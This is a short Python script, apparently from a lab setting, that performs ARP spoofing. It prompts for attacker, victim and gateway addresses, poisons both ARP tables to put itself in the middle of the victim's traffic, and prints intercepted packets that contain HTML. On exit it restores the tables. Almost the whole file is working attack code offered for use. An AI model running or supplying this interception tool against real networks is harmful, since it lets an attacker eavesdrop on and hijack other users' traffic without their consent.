# coding = UTF-8

from arp import *
import time

nic = "ens33"

#attack_ip = "192.168.139.128"
#attack_mac = "00:0C:29:92:A9:49"
#victim_ip = "192.168.139.131"#"192.168.139.129"
#victim_mac ="00-0C-29-42-5A-03"
#gateway_ip ="192.168.139.2"
#gateway_mac ="00-50-56-fb-97-d4"
#fake_mac = "11:11:11:11:11:11"

def recv(s):
	while True:
		flow = s.recvfrom(65536)
		packet = flow[0]

		if "<html>" in str(packet):
			print(packet)

def quit(s,gateway_ip,victim_ip,gateway_mac,victim_mac):
	#gateway_ip = input("Enter gateway_ip")
	arp_spoof(s,gateway_ip,gateway_mac,victim_ip,victim_mac)
	print("recover victim arp table")
	arp_spoof(s,victim_ip,victim_mac,gateway_ip,gateway_mac)
	print("recover gateway arp table")

	os._exit(0)


def main():
	s = init_socket(nic)
	global gatewayip,victim_ip,gateway_mac,victim_mac
	attack_mac = input("Enter attack_mac: ")
	victim_ip = input("Enter victim ip: ")
	attack_ip = input("Enter attack_ip: ")
	victim_mac = input("Enter victim_mac: ")
	gateway_ip = input("Enter gateway_ip: ")
	gateway_mac = input("Enter gateway_mac: ")
	arp_spoof(s,gateway_ip,attack_mac,victim_ip,victim_mac)
	arp_spoof(s,victim_ip,attack_mac,gateway_ip,gateway_mac)
	try:
		recv(s)
	except KeyboardInterrupt:
		quit(s,gateway_ip,victim_ip,gateway_mac,victim_mac)


if __name__ == "__main__" :
        main()

